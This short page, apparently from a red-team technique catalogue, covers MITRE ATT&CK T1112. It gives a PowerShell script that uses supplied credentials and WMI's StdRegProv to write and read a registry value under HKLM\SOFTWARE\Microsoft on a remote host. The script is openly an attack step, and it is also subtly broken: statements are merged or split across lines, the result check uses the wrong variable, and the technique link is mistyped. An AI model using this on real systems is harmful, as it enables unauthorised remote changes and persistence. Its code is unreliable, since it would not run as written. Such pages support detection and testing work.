# Modify Registry (Remote Registry Modification)

MITRE ATT&CK Technique: [T1112](https://attack.mitre.org/wiki/Technique/T112)
## Remote Registry via Powershell Manually

    $Username = “Domain\User”
    $Password = “Password” 
    $IPAddress = “10.0.0.1” 
    $RegValue = “blah”
    $KeyName = “fdssdfsdfds” 
    $HKEY_Local_Machine = 2147483650 $Key = “SOFTWARE\Microsoft” 
    $PSS = ConvertTo-SecureString 
    $Password -AsPlainText -Force 
    $Creds = New-Object system.management.automation.PSCredential $Username,$PSS 
    $Reg = Get-WmiObject -List -Namespace root\default -ComputerName
    $IPAddress -Credential $Creds | Where-Object {$_.Name -eq "StdRegProv"} 
    $SendingReg = $Reg.SetExpandedStringValue($HKEY_Local_Machine, $Key, $KeyName, $RegValue)
    If ($SendingResults.Returnvalue -eq 0) {echo “Excellent”} 
    $ReceiveReg = $Reg.GetExpandedStringValue($HKEY_Local_Machine, $Key, $KeyName) 
    echo = $ReceiveReg.sValue
